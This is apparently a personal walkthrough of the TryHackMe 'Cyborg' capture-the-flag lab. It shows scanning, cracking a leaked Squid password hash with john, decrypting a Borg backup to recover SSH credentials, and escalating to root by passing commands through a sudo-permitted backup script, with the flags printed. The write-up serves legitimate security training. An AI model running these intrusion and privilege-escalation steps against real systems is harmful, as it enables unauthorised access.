# Room Title

## Room Information

- **Room URL:** https://tryhackme.com/room/cyborgt8
- **Date Completed:** 2025-12-13

## Overview

## Reconnaissance
### Scan ports
```shell
$ rustscan -a 10.48.183.34
[~] File limit higher than batch size. Can increase speed by increasing batch size '-b 1048476'.
Open 10.48.183.34:22
Open 10.48.183.34:80
```

### Scan directories
```shell
$ gobuster dir -u http://10.48.183.34 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
┌──(kali㉿docker-desktop)-[~/tryhackme/09_cyborg]
└─$ gobuster dir -u http://10.48.183.34 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.48.183.34
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 312] [--> http://10.48.183.34/admin/]
/etc                  (Status: 301) [Size: 310] [--> http://10.48.183.34/etc/]
```

### Access the /admin
I know they are using [Squid proxy](https://www.squid-cache.org/) and there is a confidential information in the proxy configuration file.
![image1.png](images/image1.png)

I can download archive file `archive.tar` from the download link Archive > Download in the global navigation bar.

The archive file is encrypted with [Borg Backup](https://www.borgbackup.org/) and contains the following files.

```
home/field/dev/final_archive/
home/field/dev/final_archive/hints.5
home/field/dev/final_archive/integrity.5
home/field/dev/final_archive/config
home/field/dev/final_archive/README
home/field/dev/final_archive/nonce
home/field/dev/final_archive/index.5
home/field/dev/final_archive/data/
home/field/dev/final_archive/data/0/
home/field/dev/final_archive/data/0/5
home/field/dev/final_archive/data/0/3
home/field/dev/final_archive/data/0/4
home/field/dev/final_archive/data/0/1
```

### Access the /etc
I found two files.

![image2.png](images/image2.png)

`password` has hashed content.

This is **Apache MD5 crypt(apr1)** hash format.

```
music_archive:$apr1$BpZ.Q.1m$F0qqPwHSOG50URuOVQTTn.
```

`squid.conf` is the configuration for Squid proxy.

I know following from the configuration file.
- The proxy is using basic authentication.
- The authentication is stored in the `password` file.
- The authentication is stored in the `squid.conf` file.

```
auth_param basic program /usr/lib64/squid/basic_ncsa_auth /etc/squid/passwd
auth_param basic children 5
auth_param basic realm Squid Basic Authentication
auth_param basic credentialsttl 2 hours
acl auth_users proxy_auth REQUIRED
http_access allow auth_users
```

### Crack the hash
I got the password `squidward`.

```shell
$ john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt ./src/hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (md5crypt, crypt(3) $1$ (and variants) [MD5 128/128 ASIMD 4x2])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
squidward        (?)
1g 0:00:00:00 DONE (2025-12-13 08:33) 1.960g/s 76549p/s 76549c/s 76549C/s thankyou1..pajarita
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

### Restore the archive

List the files.

```shell
$ borg list home/field/dev/final_archive/
Enter passphrase for key /home/kali/tryhackme/09_cyborg/src/home/field/dev/final_archive:
music_archive                        Tue, 2020-12-29 14:00:38 [f789ddb6b0ec108d130d16adebf5713c29faf19c44cad5e1eeb8ba37277b1c82]
```

Restore the music_archive.

```shell
$ borg extract home/field/dev/final_archive/
Enter passphrase for key /home/kali/tryhackme/09_cyborg/src/home/field/dev/final_archive:
```

I got the directory named alex

```shell
$ tree alex
alex
├── Desktop
│   └── secret.txt
├── Documents
│   └── note.txt
├── Downloads
├── Music
├── Pictures
├── Public
├── Templates
└── Videos

9 directories, 2 files
```

`note.txt` has the username and password `alex:S3cretP@s3` for ssh login.

## Exploitation
### SSH login as alex
```shell
$ ssh alex@10.48.183.34
alex@10.48.183.34's password: S3cretP@s3
```

## Get user flag
I found the `user.txt` in the home directory of alex.

```shell
$ cat user.txt
flag{1_hop3_y0u_ke3p_th3_arch1v3s_saf3}
```

## Privilege Escalation
### Check the sudo privileges
alex can run `/etc/mp3backups/backup.sh` as root.

```shell
alex@ubuntu:~$ sudo -l
Matching Defaults entries for alex on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alex may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: /etc/mp3backups/backup.sh
```

The script executes any command with the `-c` option.

```shell
while getopts c: flag
do
	case "${flag}" in
		c) command=${OPTARG};;
	esac
done
```

I can run `id` command as root.

```shell
$ sudo /etc/mp3backups/backup.sh -c "id"
...
Backup finished
uid=0(root) gid=0(root) groups=0(root)
```

### Get root flag
```shell
alex@ubuntu:~$ sudo /etc/mp3backups/backup.sh -c "cat /root/root.txt"
...
Backup finished
flag{Than5s_f0r_play1ng_H0p£_y0u_enJ053d}
```

## Completed

![image3.png](images/image3.png)

## Tools Used

- rustscan
- gobuster
- borg
- john
